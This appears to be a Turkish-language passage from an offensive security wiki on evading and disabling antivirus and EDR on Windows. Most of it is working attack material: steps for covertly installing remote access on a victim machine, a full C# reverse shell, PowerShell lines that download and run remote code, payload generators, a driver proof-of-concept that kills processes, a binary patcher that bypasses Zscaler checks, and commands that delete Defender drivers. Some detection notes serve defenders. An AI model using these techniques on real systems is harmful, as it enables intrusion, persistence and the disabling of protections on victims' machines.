Bunu önlemek için Windows, **harici süreçlerin** güvenlik süreçlerinin token'ları üzerinde handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Güvenilir Yazılımları Kullanma

### Chrome Remote Desktop

[**bu blog yazısında**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, kurbanın bilgisayarına Chrome Remote Desktop'ı yükleyip ardından onu ele geçirmek ve kalıcılığı sürdürmek kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine, ardından Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Kurulum programını kurbanda sessizce çalıştırın (yönetici yetkisi gerekir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına dönüp next'e tıklayın. Sihirbaz sizden yetkilendirme isteyecektir; devam etmek için Authorize düğmesine tıklayın.
4. Sağlanan komutu gerekli değişikliklerle çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parametresi, GUI'yi kullanmadan PIN'i ayarlar).
 

## Gelişmiş Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion çok karmaşık bir konudur; bazen tek bir sistemdeki birçok farklı telemetri kaynağını hesaba katmanız gerekir. Bu nedenle olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkânsızdır.

Karşılaşacağınız her ortamın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi şiddetle öneririm.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılan bir başka harika konuşma.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi bölümleri kötü amaçlı bulduğunu kontrol etme**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) kullanarak, **Defender'ın hangi bölümü** kötü amaçlı bulduğunu **tespit edene kadar ikili dosyanın bölümlerini kaldırabilir** ve ilgili kısmı size ayırmasını sağlayabilirsiniz.\
Aynı işi yapan bir diğer araç [**avred**](https://github.com/dobin/avred); hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde açık web üzerinden sunuyor.

### **Telnet Sunucusu**

Windows 10'a kadar tüm Windows sürümlerinde, yönetici olarak yükleyebileceğiniz bir **Telnet sunucusu** vardı. Bunu yapmak için:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sistem başlatıldığında **başlamasını** sağlayın ve şimdi **çalıştırın**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet portunu değiştir** (gizlilik) ve güvenlik duvarını devre dışı bırak:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup dosyası değil, bin indirmelerini istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanına bir parola belirleyin
- _View-Only Password_ alanına bir parola belirleyin

Ardından, _**winvnc.exe**_ binary dosyasını ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**attacker**, reverse **VNC connection** yakalamaya hazır olması için kendi **host**'unda `vncviewer.exe -listen 5900` binary dosyasını **çalıştırmalıdır**. Ardından, **victim** içinde: winvnc daemon'ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Gizliliği korumak için bazı şeyleri yapmamalısınız

- Zaten çalışıyorsa `winvnc`'i başlatmayın; yoksa bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. `tasklist | findstr winvnc` ile çalışıp çalışmadığını kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc`'i başlatmayın; yoksa [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` komutunu çalıştırmayın; yoksa bir [popup](https://i.imgur.com/oc18wcu.png) tetiklersiniz

### GreatSCT

Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT içinde:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Şimdi **lister'ı başlatın** `msfconsole -r file.rc` ile ve **xml payload**'ı şu komutla **çalıştırın**:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Mevcut Defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell’imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Şununla kullan:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# derleyicisini kullanma

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için python kullanımı örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Kendi Savunmasız Sürücünü Getir (BYOVD) – Kernel Alanından AV/EDR'yi Devre Dışı Bırakma

Storm-2603, ransomware bırakmadan önce endpoint korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol aracı kullandı. Araç, **kendi savunmasız ama *imzalı* sürücüsünü** beraberinde getiriyor ve Protected-Process-Light (PPL) AV hizmetlerinin bile engelleyemediği ayrıcalıklı kernel işlemlerini gerçekleştirmek için bu sürücüden yararlanıyor.<sup>[[12]](#references)</sup>

Önemli çıkarımlar
1. **İmzalı sürücü**: Diske yazılan dosya `ServiceMouse.sys`, ancak ikili dosya Antiy Labs'ın “System In-Depth Analysis Toolkit” paketindeki yasal olarak imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığından Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Hizmet kurulumu**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   İlk satır driver'ı **kernel service** olarak kaydeder, ikinci satır ise onu başlatarak `\\.\ServiceMouse` öğesini user land'den erişilebilir hâle getirir.
3. **Driver tarafından sunulan IOCTL'ler**
   | IOCTL code | Capability                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID ile rastgele bir process'i sonlandırma (Defender/EDR servislerini sonlandırmak için kullanılır) |
   | `0x990000D0` | Diskteki rastgele bir dosyayı silme |
   | `0x990001D0` | Driver'ı unload etme ve servisi kaldırma |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Neden işe yarıyor**: BYOVD, user-mode korumalarını tamamen atlar; kernel'de çalışan kod, PPL/PP, ELAM veya diğer hardening özelliklerinden bağımsız olarak *protected* süreçleri açabilir, sonlandırabilir veya kernel nesnelerini kurcalayabilir.

Tespit / Azaltma
• Windows'un `AToolsKrnl64.sys` dosyasını yüklemeyi reddetmesi için Microsoft'un güvenlik açığı bulunan sürücü engelleme listesini (`HVCI`, `Smart App Control`) etkinleştirin.
• Yeni *kernel* hizmetlerinin oluşturulmasını izleyin ve bir sürücü world-writable bir dizinden yüklendiğinde veya allow-list'te bulunmadığında uyarı verin.
• Özel cihaz nesnelerine yönelik user-mode tanıtıcılarını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Diskteki Binary'leri Yamayarak Zscaler Client Connector Posture Kontrollerini Atlatma

Zscaler **Client Connector**, cihaz posture kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye güvenir. İki zayıf tasarım tercihi, tam bir bypass'ı mümkün kılar:

1. Posture değerlendirmesi **tamamen istemci tarafında** gerçekleşir (sunucuya bir boolean gönderilir).
2. Dahili RPC uç noktaları, yalnızca bağlanan executable'ın (WinVerifyTrust aracılığıyla) **Zscaler tarafından imzalanmış** olduğunu doğrular.<sup>[[11]](#references)</sup>

**Diskteki dört imzalı binary yamalanarak** her iki mekanizma da etkisiz hâle getirilebilir:

| Binary | Yamalanan özgün mantık | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece tüm kontroller uyumlu olur |
| `ZSAService.exe` | `WinVerifyTrust`'e dolaylı çağrı | NOP-ed ⇒ imzasız olanlar da dahil, tüm süreçler RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tüneldeki bütünlük kontrolleri | Kısa devre edilir |

Minimal patcher alıntısı:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Orijinal dosyaları değiştirdikten ve hizmet yığınını yeniden başlattıktan sonra:

* **Tüm** duruş kontrolleri **yeşil/uyumlu** görünür.
* İmzasız veya değiştirilmiş ikili dosyalar, adlandırılmış kanal RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş ana bilgisayar, Zscaler politikalarında tanımlanan iç ağa kısıtlamasız erişim kazanır.

Bu vaka çalışması, tamamen istemci tarafındaki güven kararlarının ve basit imza denetimlerinin birkaç baytlık yamayla nasıl aşılabileceğini gösteriyor.

## Microsoft Defender `BTR.sys` güvenilir işlevselliğinin kötüye kullanımı

Defender'ın **Boot-Time Removal** sürücüsü, klasik BYOVD'ye yararlı bir karşı örnektir. `BTR.sys`, bellek bozulması hatası ve IOCTL arayüzü olmayan, Microsoft tarafından imzalanmış meşru bir düzeltme bileşenidir; yönetici erişimi ve `SeLoadDriverPrivilege` elde ettikten sonra operatör, bunun yerine özel düzeltme işlemini taklit ederek amaçlanan Ring-0 dosya/kayıt defteri işlemlerini gerçekleştirebilir. Bu, **ele geçirilme sonrası AV/EDR etkisizleştirme aracı olup initial access veya privilege escalation değildir** ve sürücü, dikkat çeken bir üçüncü taraf sürücüyü içe aktarmak yerine hedefin kendi `MpEngine.dll` dosyasındaki `BOOTTIMETOOL` kaynağından çıkarılabilir.<sup>[[36]](#references)</sup>

### Tek kullanımlık sürücünün hazırlanması

Defender normalde kaynağı rastgele bir `[a-z]{8}.sys` dosyası olarak bırakır ve benzer adlı bir kernel hizmeti kaydeder. `DriverEntry`, hizmetin `Args` değerini okur, başvurulan NTFS ADS'yi açar, eylem listesinin şifresini çözüp doğrular, geri bildirim yazar ve başarılı yürütmenin ardından `0xC0000056` (`STATUS_DELETE_PENDING`) döndürerek sürücünün bellekte kalmak yerine yüklemesinin kaldırılmasını sağlar. Taklit edilmiş bir hizmet aşağıdaki karakteristik değerlere sahiptir.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` akışı, RC4 ile şifrelenmiş tek bir blob içerir. Analiz edilen derlemeler sabit 256 baytlık bir anahtarı yeniden kullandığından, şifreleme bir yetkilendirme sınırı değildir. Geçerli bir düz metin; 24 baytlık genel bir başlık (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, başlık CRC’si ve payload’dan türetilen bir işlem kimliği), ardından null ile sonlandırılmış bir UTF-16 geri bildirim yolu ve istenen sayıda öğe içerir. Her öğe, eyleme özgü verilerin izlediği 16 baytlık bir başlığa (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sahiptir ve bu veriler **tam olarak dört NUL baytıyla** sonlanır. Her başlık/veri bölgesi; polinom `0xEDB88320`, başlangıç durumu `0xFFFFFFFF` ve **son XOR olmadan** (`~CRC32`) CRC-32 ile bağımsız olarak denetlenir; CRC durumu her bölge için sıfırlanır.<sup>[[36]](#references)[[37]](#references)</sup>

Kabul edilen eylem kimlikleri, bu kernel primitive’lerini açığa çıkarır.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Öğe verisi | Sonuç |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Kilitli bir dosya da dahil olmak üzere bir dosyayı siler |
| 2 | `[UTF-16 path]` | Boş bir dizini kaldırır |
| 3 | `[Flags][source][destination]` | Bir dosyayı saldırganın seçtiği korumalı bir yola taşır; boş hedef, silme anlamına gelir |
| 4 | `[Flags][key path]` | Bir registry anahtarını özyinelemeli olarak siler |
| 5 | `[Flags][key path + "\\" + value]` | Bir registry değerini siler |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Bir registry değeri oluşturur/günceller ve eksik anahtar yollarını oluşturur |

5 ve 6 numaralı eylemlerde, kabloda kullanılan anahtar/değer ayırıcısı **art arda gelen iki ters eğik çizgidir**; geleneksel biçimde yazılmış bir yol doğru şekilde bölünmez. Geri bildirim dosyası çoğunlukla isteği yansıtır, ancak her öğenin ilk dört veri baytı, sonuçta oluşan `NTSTATUS` değerine dönüşür. Önde gelen bir flags alanı olmayan 1 ve 2 numaralı eylemlerde BTR, bu duruma yer açmak için yolu sondaki dört ayrılmış bayta kaydırır.<sup>[[36]](#references)</sup>

### `BTR_CLI` iş akışı ve erken önyükleme aralığı

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) zincirin tamamını uygular: yerel Defender’dan `BTR.sys` dosyasını çıkarır, `<random>.sys:changelist` ve bir geri bildirim akışı oluşturur, zincirlenmiş eylemleri serileştirir/sağlama toplamlarını hesaplar/şifreler, service registry anahtarını doğrudan oluşturur ve `-trigger now` için `NtLoadDriver` çağırır ya da `-trigger boot` için bunu system-start driver olarak bırakır. Registry’yi doğrudan hazırlamak, normal SCM `CreateServiceW` yolunu atlar ve bu nedenle service-install Event ID 7045 kaydı oluşturmaz. Boot-triggered kalıntılar daha sonra `BTR_CLI.exe -cleanup <service_name>` ile kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` kullanılamaz; çünkü depolama yığını ve `SystemRoot` bağlantısı hazır olmadan önce BTR, `DriverEntry` içinden dosya G/Ç işlemleri gerçekleştirir. Bunun yerine yüksek öncelikli `Boot Bus Extender` grubuyla `Start=1` kullanıldığında, işlem Phase 1'de gerçekleşir: NTFS kullanılabilir durumdadır, ancak sistem başlangıcında çalışan birçok güvenlik sürücüsü ve kullanıcı modundaki EDR hizmeti henüz başlatılmamıştır. `WdFilter` gibi önyükleme başlangıç filtreleri zaten yüklenmiş olabilir; ancak BTR, sonraki başlangıçtan önce ikili dosyalarını veya hizmet yapılandırmalarını kaldırabilir ve SCM bunları başlatmadan önce hizmet yürütülebilir dosyalarını silebilir. BTR, önyükleme başlangıcı değerlendirmesinden sonra çalıştığı ve geçerli bir Microsoft imzası taşıdığı için ELAM bu açığı kapatmaz.<sup>[[36]](#references)</sup>

Birden fazla eylem tek işlemde yürütülür. PoC, sabit kodlanmış `\SystemRoot\Temp\BootClean.log` için Eylem 1'i başa ekler: BTR bu günlük dosyasını oluşturur, ardından kendi silme isteğini işleyerek boşaltılmadan önce dosyayı kaldırır. Bu, geride kalan kanıtı azaltır; geri bildirim `<random>.sys:<random>.dat` içine yazıldığında ise sürücü ve her iki akış birlikte kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>

### Yüksek sinyalli tespit korelasyonları

Yalnızca imzaya dayalı kurallar ve Microsoft'un savunmasız sürücü engelleme listesi, BTR'nin amaçlanan işlevlerinin kötüye kullanılmasını önlemez. Meşru Defender soyunu rastgele bir başlatıcıdan ayırarak aşağıdaki davranış korelasyonlarını tercih edin.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` oluşturulması, BTR hazırlama işlemlerinin tümünde görülür. Aynı `.sys` dosyasına eklenmiş bir `.dat` ADS'si özellikle şüphelidir; çünkü meşru Defender, geri bildirimi genellikle `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` altına yazar.
- **System 7045 olmadan Sysmon 12/13:** `Args=...:changelist` ve `Group=Boot Bus Extender` içeren `HKLM\SYSTEM\CurrentControlSet\Services\<random>` kayıt defteri anahtarının doğrudan oluşturulmasını ve buna karşılık gelen bir SCM kurulum olayının bulunmamasını ilişkilendirin.
- **Sysmon 6 -> 23:** Defender dışı bilinen bir soydan yüklenen BTR sürücüsünü, özellikle güvenlik ikili dosyaları için, ardından gelen ve `System`/PID 4'e atfedilen dosya silme işlemiyle ilişkilendirin.
- **Sysmon 11 -> 23:** `System`/PID 4 tarafından `\SystemRoot\Temp\BootClean.log` dosyasının kısa süre içinde oluşturulup silinmesi durumunda uyarı verin.
- `SeLoadDriverPrivilege` atamasını/etkinleştirilmesini kısıtlayın ve denetleyin; bir güvenlik aracı sürücüsü `cmd.exe`, PowerShell veya bilinmeyen bir işlem tarafından hazırlandığında yalnızca Microsoft imzası yeterli güvence sağlamaz.

## LOLBIN'lerle AV/EDR'ye Müdahale Etmek İçin Protected Process Light (PPL) Kötüye Kullanımı

Protected Process Light (PPL), yalnızca eşit veya daha yüksek korumalı işlemlerin birbirlerine müdahale edebilmesini sağlayan bir imzalayan/düzey hiyerarşisi uygular. Saldırgan olarak, PPL etkin bir ikili dosyayı meşru biçimde başlatabiliyor ve bağımsız değişkenlerini kontrol edebiliyorsanız, zararsız işlevleri (ör. günlük kaydı) AV/EDR'nin kullandığı korumalı dizinlere karşı kısıtlı, PPL destekli bir yazma ilkel işlemine dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir işlemin PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklenen tüm DLL'ler), PPL'yi destekleyen bir EKU ile imzalanmış olmalıdır.
- İşlem, şu bayraklarla CreateProcess kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- İkili dosyanın imzalayanıyla eşleşen uyumlu bir koruma düzeyi istenmelidir (ör. kötü amaçlı yazılımdan koruma imzalayanları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows imzalayanları için `PROTECTION_LEVEL_WINDOWS`). Yanlış düzeylerle işlem oluşturma başarısız olur.

PP/PPL ve LSASS korumasına ilişkin daha genel bir giriş için ayrıca buraya bakın:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Başlatıcı araçları
- Açık kaynaklı yardımcı araç: CreateProcessAsPPL (koruma düzeyini seçer ve bağımsız değişkenleri hedef EXE'ye iletir):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Kullanım kalıbı:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- İmzalı sistem ikilisi `C:\Windows\System32\ClipUp.exe` kendi işlemini başlatır ve çağıranın belirttiği yola bir log dosyası yazmak için parametre kabul eder.
- PPL işlemi olarak başlatıldığında dosya yazma işlemi PPL desteğiyle gerçekleşir.
- ClipUp, boşluk içeren yolları ayrıştıramaz; normalde korunan konumları belirtmek için 8.3 kısa yollarını kullanın.

8.3 kısa yol yardımcıları
- Kısa adları listeleyin: Her üst dizinde `dir /x` komutunu çalıştırın.
- cmd'de kısa yolu elde edin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (soyut)
1) PPL özellikli LOLBIN'i (ClipUp) bir başlatıcı (ör. CreateProcessAsPPL) kullanarak `CREATE_PROTECTED_PROCESS` ile başlatın.
2) Korunan bir AV dizininde (ör. Defender Platform) dosya oluşturmayı zorlamak için ClipUp log yolu parametresini belirtin. Gerekirse 8.3 kısa adlarını kullanın.
3) Hedef ikili, AV çalışırken normalde açık veya kilitli durumdaysa (ör. MsMpEng.exe), AV başlamadan önce, önyüklemenin başında yazma işlemini zamanlayın. Daha önce çalışacağı güvenilir bir otomatik başlatma hizmeti yükleyin. Önyükleme sırasını Process Monitor ile doğrulayın (önyükleme günlüğü).
4) Yeniden başlatıldığında PPL destekli yazma işlemi, AV ikililerini kilitlemeden önce gerçekleşir; böylece hedef dosya bozulur ve AV'nin başlaması engellenir.

Örnek kullanım (güvenlik amacıyla yollar gizlenmiş/kısaltılmıştır):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes and constraints
- ClipUp'ın yazdığı içeriği yerleştirme dışında kontrol edemezsiniz; bu primitive, içeriği hassas biçimde enjekte etmekten ziyade bozulma için uygundur.
- Bir hizmeti yüklemek/başlatmak ve yeniden başlatma fırsatından yararlanmak için yerel admin/SYSTEM gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; açılış sırasında çalıştırma dosya kilitlerini önler.

Detections
- Özellikle standart olmayan başlatıcılar tarafından başlatılan `ClipUp.exe` işlemlerinin, açılış civarında alışılmadık argümanlarla oluşturulması.
- Şüpheli ikili dosyaları otomatik başlatacak şekilde yapılandırılmış yeni hizmetler ve Defender/AV'den önce tutarlı biçimde başlatılmaları. Defender başlangıç hatalarından önce hizmet oluşturma/değiştirme işlemlerini araştırın.
- Defender ikili dosyalarında/Platform dizinlerinde dosya bütünlüğü izleme; korumalı işlem bayrakları taşıyan işlemler tarafından beklenmedik dosya oluşturma/değiştirme.
